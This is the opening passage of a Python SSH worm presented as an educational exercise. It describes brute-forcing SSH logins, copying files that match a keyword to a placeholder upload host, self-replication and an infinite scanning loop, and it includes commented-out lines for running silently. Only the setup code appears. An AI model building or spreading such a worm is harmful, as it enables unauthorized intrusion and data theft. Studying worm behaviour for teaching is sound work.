##  This is a harmless worm meant for educational purposes only.  It can
##  only attack machines that run SSH servers and those too only under 
##  very special conditions that are described below. Its primary features 
##  are:
##
##  -- It tries to break in with SSH login into a randomly selected set of
##     hosts with a randomly selected set of usernames and with a randomly
##     chosen set of passwords. 
##
##  -- If it can break into a host, it looks for the files that contain the
##     string `abracadabra'.  It downloads such files into the host where
##     the worm resides.
##
##  -- It uploads the files thus exfiltrated from an infected machine to a
##     designated host in the internet. You'd need to supply the IP address
##     and login credentials at the location marked yyy.yyy.yyy.yyy in the
##     code for this feature to work.  The exfiltrated files would be 
##     uploaded to the host at yyy.yyy.yyy.yyy. If you don't supply this
##     information, the worm will still work, but now the files exfiltrated
##     from the infected machines will stay at the host where the worm
##     resides.  For an actual worm, the host selected for yyy.yyy.yyy.yyy
##     would be a previosly infected host.
##
##  -- It installs a copy of itself on the remote host that it successfully
##     breaks into.  If a user on that machine executes the file thus
##     installed (say by clicking on it), the worm activates itself on
##     that host.
##
##  -- Once the worm is launched in an infected host, it runs in an
##     infinite loop, looking for vulnerable hosts in the internet.  By
##     vulnerable I mean the hosts for which it can successfully guess at
##     least one username and the corresponding password.
##
##  -- IMPORTANT: After the worm has landed in a remote host, the worm can
##     be activated on that machine only if Python is installed on that
##     machine.  Another condition that must hold at the remote machine is
##     that it must have the Python modules paramiko and scp installed.
##
##  -- The username and password construction strategies used in the worm
##     are highly unlikely to result in actual usernames and actual 
##     passwords anywhere.  (However, for demonstrating the worm code in
##     an educational program, this part of the code can be replaced with
##     a more potent algorithm.)
##
##  -- Given all of the conditions I have listed above for this worm to
##     propagate into the internet, we can be quite certain that it is not
##     going to cause any harm.  Nonetheless, the worm should prove useful
##     as an educational exercise.
##
##
##  If you want to play with the worm, run it first in the `debug' mode. 
##  For the debug mode of execution, you would need to supply the following
##  information to the worm:
##
##  1)   Change to 1 the value of the variable $debug.  
##
##  2)   Provide an IP address and the login credentials for a host that you
##       have access to and that contains one or more documents that
##       include the string "abracadabra".  This information needs to go
##       where you see xxx.xxx.xxx.xxx in the code.
##
##  3)   Provide an IP address and the login credentials for a host that 
##       will serve as the destination for the files exfiltrated from the
##       successfully infected hosts. The IP address and the login 
##       credentials go where you find the string yyy.yyy.yyy.yyy in the 
##       code.
##
##  After you have executed the worm code, you will notice that a copy of
##  the worm has landed at the host at the IP address you used for
##  xxx.xxx.xxx.xxx and you'll see a new directory at the host you used for
##  yyy.yyy.yyy.yyy.  This directory will contain those files from the
##  xxx.xxx.xxx.xxx host that contained the string `abracadabra'.

import sys
import os
import random
import paramiko
import scp
import select
import signal

##   You would want to uncomment the following two lines for the worm to 
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 0      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
